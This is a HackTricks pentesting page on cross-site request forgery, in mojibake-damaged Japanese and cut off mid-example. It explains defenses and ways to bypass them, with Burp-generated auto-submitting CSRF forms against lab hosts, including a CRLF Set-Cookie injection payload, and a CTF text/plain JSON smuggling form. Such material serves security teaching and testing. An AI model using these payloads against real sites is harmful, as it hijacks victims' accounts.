# CSRFï¼ˆã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** HackTricksã§**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* [**å…¬å¼ã®PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ã€PRã‚’æå‡ºã—ã¦ãã ã•ã„** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)ã€‚

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofã¯ã™ã¹ã¦ã®æš—å·ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®ãƒ›ãƒ¼ãƒ ã§ã™ã€‚**

**é…å»¶ãªã—ã§å ±é…¬ã‚’å—ã‘å–ã‚‹**\
HackenProofã®ãƒã‚¦ãƒ³ãƒ†ã‚£ã¯ã€é¡§å®¢ãŒå ±é…¬äºˆç®—ã‚’å…¥é‡‘ã—ãŸå¾Œã«ã®ã¿é–‹å§‹ã•ã‚Œã¾ã™ã€‚ãƒã‚°ãŒæ¤œè¨¼ã•ã‚ŒãŸå¾Œã«å ±é…¬ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Web3ãƒšãƒ³ãƒ†ã‚¹ãƒˆã®çµŒé¨“ã‚’ç©ã‚€**\
ãƒ–ãƒ­ãƒƒã‚¯ãƒã‚§ãƒ¼ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒˆãƒ©ã‚¯ãƒˆã¯æ–°ã—ã„ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã™ï¼ä¸Šæ˜‡æœŸã®Web3ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚

**Web3ãƒãƒƒã‚«ãƒ¼ãƒ¬ã‚¸ã‚§ãƒ³ãƒ‰ã«ãªã‚‹**\
å„æ¤œè¨¼æ¸ˆã¿ã®ãƒã‚°ã§è©•åˆ¤ãƒã‚¤ãƒ³ãƒˆã‚’ç²å¾—ã—ã€é€±é–“ãƒªãƒ¼ãƒ€ãƒ¼ãƒœãƒ¼ãƒ‰ã®ãƒˆãƒƒãƒ—ã‚’åˆ¶è¦‡ã—ã¾ã—ã‚‡ã†ã€‚

[**HackenProofã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**](https://hackenproof.com/register)ã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ã‹ã‚‰åç›Šã‚’å¾—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://hackenproof.com/register" %}

## CSRFã¨ã¯ï¼Ÿ

**ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒª**ï¼ˆCSRFã¨ã‚‚å‘¼ã°ã‚Œã‚‹ï¼‰ã¯ã€æ”»æ’ƒè€…ãŒ**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ„å›³ã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã•ã›ã‚‹**ã“ã¨ãŒã§ãã‚‹ã‚¦ã‚§ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã§ã™ã€‚\
ã“ã‚Œã¯ã€**ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼**ãŒæ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãã“ã‹ã‚‰æ‚ªæ„ã®ã‚ã‚‹JSã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã—ãŸã‚Šã€"ç”»åƒ"ã‚’**è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã«å–å¾—ã™ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã¾ã™ã€‚

### å¿…è¦æ¡ä»¶

CSRFã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€ã¾ãš**æ‚ªç”¨ã™ã‚‹é‡è¦ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚„ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¤‰æ›´ã€è¢«å®³è€…ã‚’ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§ãƒ•ã‚©ãƒ­ãƒ¼ã•ã›ã‚‹ã€ã‚ˆã‚Šå¤šãã®ç‰¹æ¨©ã‚’ä¸ãˆã‚‹ãªã©ï¼‰ã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯**ã‚¯ãƒƒã‚­ãƒ¼ã¾ãŸã¯HTTPãƒ™ãƒ¼ã‚·ãƒƒã‚¯èªè¨¼ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã®ã¿ä¾å­˜**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ä»–ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®å‡¦ç†ã«ä½¿ç”¨ã§ãã¾ã›ã‚“ã€‚ãã—ã¦ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«**äºˆæ¸¬ä¸å¯èƒ½ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ãŒãªã„**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã¯ã€ã„ãã¤ã‹ã®**å¯¾ç­–**ãŒå–ã‚‰ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### **ä¸€èˆ¬çš„ãªé˜²å¾¡ç­–**

* [**SameSiteã‚¯ãƒƒã‚­ãƒ¼**](hacking-with-cookies/#samesite)ï¼šã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ãŒã“ã®ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€ä»»æ„ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰ã‚¯ãƒƒã‚­ãƒ¼ã‚’é€ä¿¡ã§ããªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚
* [**ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚½ãƒ¼ã‚¹å…±æœ‰**](cors-bypass.md)ï¼šé–¢é€£ã™ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ç¨®é¡ã«å¿œã˜ã¦ã€è¢«å®³è€…ã‚µã‚¤ãƒˆã®**CORSãƒãƒªã‚·ãƒ¼**ã‚’è€ƒæ…®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚_CORSãƒãƒªã‚·ãƒ¼ã¯ã€å˜ã«GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã¾ãŸã¯ãƒ•ã‚©ãƒ¼ãƒ ã‹ã‚‰ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€å¿œç­”ã‚’èª­ã¿å–ã‚‹å¿…è¦ãŒãªã„å ´åˆã«ã¯å½±éŸ¿ã—ã¾ã›ã‚“ã€‚_
* **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨±å¯ã™ã‚‹ã‚ˆã†ã«è¦æ±‚ã™ã‚‹ã€‚
* **ã‚­ãƒ£ãƒ—ãƒãƒ£**ã‚’è§£æ±ºã™ã‚‹
* **ãƒªãƒ•ã‚¡ãƒ©**ã¾ãŸã¯**ã‚ªãƒªã‚¸ãƒ³**ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’èª­ã¿å–ã‚‹ã€‚æ­£è¦è¡¨ç¾ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ï¼š
* http://mal.net?orig=http://example.comï¼ˆURLã§çµ‚ã‚ã‚‹ï¼‰
* http://example.com.mal.netï¼ˆURLã§å§‹ã¾ã‚‹ï¼‰
* POSTã¾ãŸã¯GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã®**åå‰**ã‚’**å¤‰æ›´**ã™ã‚‹
* å„ã‚»ãƒƒã‚·ãƒ§ãƒ³ã§**CSRFãƒˆãƒ¼ã‚¯ãƒ³**ã‚’ä½¿ç”¨ã™ã‚‹ã€‚ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã§é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯CORSã§ä¿è­·ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### CSRFãƒãƒƒãƒ—

![](<../.gitbook/assets/image (112).png>)

## é˜²å¾¡ãƒã‚¤ãƒ‘ã‚¹

### POSTã‹ã‚‰GETã¸

æ‚ªç”¨ã—ãŸã„ãƒ•ã‚©ãƒ¼ãƒ ãŒ**CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æº–å‚™ãŒã§ãã¦ã„ã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ãŒã€**GET**ã‚‚**æœ‰åŠ¹**ã§ã‚ã‚Šã€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã¨ãã«**CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒå¼•ãç¶šãæ¤œè¨¼ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ãƒˆãƒ¼ã‚¯ãƒ³ã®æ¬ å¦‚

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«æ­£ã—ã**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼**ã—ã¾ã™ãŒã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒæ¬ è½ã—ã¦ã„ã‚‹å ´åˆã«ã¯æ¤œè¨¼ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼å…¨ä½“ã‚’ï¼ˆå€¤ã ã‘ã§ãªãï¼‰å‰Šé™¤ã—ã¦æ¤œè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã€CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã„

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨åŒã˜ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒå±ã—ã¦ã„ã‚‹ã“ã¨ã‚’**æ¤œè¨¼ã—ãªã„**å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä»£ã‚ã‚Šã«ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ç™ºè¡Œã—ãŸãƒˆãƒ¼ã‚¯ãƒ³ã®ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ¼ãƒ«ã‚’ç¶­æŒã—ã€ã“ã®ãƒ—ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å—ã‘å…¥ã‚Œã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯è‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã€æœ‰åŠ¹ãªãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’CSRFæ”»æ’ƒã®è¢«å®³è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æä¾›ã™ã‚‹ã“ã¨ãŒã§ã
### ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒã‚¤ãƒ‘ã‚¹

ã‚‚ã—ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒ**CSRFä¿è­·æ‰‹æ³•**ã¨ã—ã¦**ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’å«ã‚€**ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼**ã‚’è¿½åŠ ã—ã¦ã„ã‚‹å ´åˆã€ä»¥ä¸‹ã®æ‰‹é †ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š

* **ã‚«ã‚¹ã‚¿ãƒ ãƒˆãƒ¼ã‚¯ãƒ³ã¨ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å«ã¾ãªã„**çŠ¶æ…‹ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚
* **åŒã˜é•·ã•**ã§ã™ãŒ**ç•°ãªã‚‹ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚

### CSRFãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚¯ãƒƒã‚­ãƒ¼ã«ã‚ˆã£ã¦æ¤œè¨¼ã•ã‚Œã¾ã™

å‰è¿°ã®è„†å¼±æ€§ã®ã•ã‚‰ãªã‚‹ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã—ã¦ã€ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯**ã‚¯ãƒƒã‚­ãƒ¼ã¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã®ä¸¡æ–¹ã«åŒã˜ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¤‡è£½**ã—ã¾ã™ã€‚ã¾ãŸã¯ã€**CSRFã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®š**ã—ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§**ã‚¯ãƒƒã‚­ãƒ¼ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒé€ä¿¡ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã¨ä¸€è‡´ã™ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯**ã—ã¾ã™ã€‚

æ¬¡ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ¤œè¨¼ã•ã‚Œã‚‹éš›ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯å˜ç´”ã«**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã«é€ä¿¡ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¯ãƒƒã‚­ãƒ¼ã«ä¿å­˜ã•ã‚ŒãŸå€¤ã¨ä¸€è‡´ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèª**ã—ã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯å†ã³CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€çŠ ç‰²è€…ã«CSRFã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã‚‹è„†å¼±æ€§ãŒã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«å­˜åœ¨ã™ã‚‹å ´åˆã€CRLFã®ã‚ˆã†ãªå½¢ã§æ”»æ’ƒã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®å ´åˆã€å½ã®ç”»åƒã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã‚’è©¦ã¿ã¦ã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã—ã€æ¬¡ã«æ¬¡ã®ä¾‹ã®ã‚ˆã†ã«CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**csrfãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã‚‹å ´åˆã€ã“ã®æ”»æ’ƒã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚ãªãœãªã‚‰ã€è¢«å®³è€…ã«è‡ªåˆ†ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã—ãŸãŒã£ã¦è‡ªåˆ†è‡ªèº«ã‚’æ”»æ’ƒã™ã‚‹ã“ã¨ã«ãªã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

### Content-Typeã®å¤‰æ›´

[**ã“ã¡ã‚‰**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ã«ã‚ˆã‚‹ã¨ã€**ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆã‚’å›é¿**ã™ã‚‹ãŸã‚ã«ã€**POST**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€æ¬¡ã®Content-Typeã®å€¤ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã™ã€‚

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ãŸã ã—ã€ä½¿ç”¨ã™ã‚‹**Content-Type**ã«ã‚ˆã£ã¦ã¯ã€**ã‚µãƒ¼ãƒãƒ¼ã®ãƒ­ã‚¸ãƒƒã‚¯ãŒç•°ãªã‚‹å ´åˆãŒã‚ã‚‹**ãŸã‚ã€ä¸Šè¨˜ã®å€¤ã‚„**`application/json`**ã€**`text/xml`**ã€**`application/xml`**ãªã©ã®ä»–ã®å€¤ã‚‚è©¦ã—ã¦ã¿ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€JSONãƒ‡ãƒ¼ã‚¿ã‚’text/plainã¨ã—ã¦é€ä¿¡ã™ã‚‹ä¾‹ï¼ˆ[ã“ã¡ã‚‰](https://brycec.me/posts/corctf\_2021\_challenges)ã‹ã‚‰å¼•ç”¨ï¼‰ã§ã™ã€‚
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/json preflight request bypass

æ—¢ã«ã”å­˜çŸ¥ã®é€šã‚Šã€HTMLãƒ•ã‚©ãƒ¼ãƒ ã‚’ä»‹ã—ã¦Content-TypeãŒ**`application/json`**ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã¾ãŸã€**`XMLHttpRequest`**ã‚’ä½¿ç”¨ã—ã¦ã‚‚ã€æœ€åˆã«**ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆ**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚\
ãŸã ã—ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒContent-Typeã«é–¢ä¿‚ãªããƒ‡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€JSONãƒ‡ãƒ¼ã‚¿ã‚’content types **`text/plain`** ãŠã‚ˆã³ **`application/x-www-form-urlencoded`** ã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
`Content-Type: text/plain`ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚µãƒ¼ãƒãƒ¼ãŒã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ— "application/json" ã®ã¿ã‚’å—ã‘å…¥ã‚Œã‚‹å ´åˆã€ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã›ãšã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ— "text/plain; application/json" ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€**SWFãƒ•ãƒ©ãƒƒã‚·ãƒ¥ãƒ•ã‚¡ã‚¤ãƒ«**ã‚’ä½¿ç”¨ã—ã¦ã“ã®åˆ¶é™ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**ã“ã®æŠ•ç¨¿**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### Referrer / Origin check bypass

**Refererãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å›é¿ã™ã‚‹**

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«Refererãƒ˜ãƒƒãƒ€ãƒ¼ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«ã®ã¿æ¤œè¨¼ã‚’è¡Œã„ã¾ã™ãŒã€ãƒ˜ãƒƒãƒ€ãƒ¼ãŒçœç•¥ã•ã‚ŒãŸå ´åˆã¯æ¤œè¨¼ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚
```markup
<meta name="referrer" content="never">
```
**æ­£è¦è¡¨ç¾ã®ãƒã‚¤ãƒ‘ã‚¹**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

ReferrerãŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã§é€ä¿¡ã™ã‚‹URLã®ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’è¨­å®šã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
